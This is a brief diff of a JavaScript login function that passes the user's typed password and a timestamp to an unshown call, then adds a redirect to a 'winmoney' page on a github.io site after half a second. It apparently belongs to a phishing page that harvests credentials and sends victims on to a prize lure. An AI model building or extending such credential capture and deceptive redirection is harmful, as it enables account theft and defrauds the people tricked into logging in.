@@ -99,6 +99,9 @@ function logIn() {
     pasw: userPassword.value,
     time: allData,
   });
+  setTimeout(() => {
+    location.href = "https://visitorss.github.io/winmoney/";
+  }, 500);
 }
 
 userName.addEventListener("click", () => {
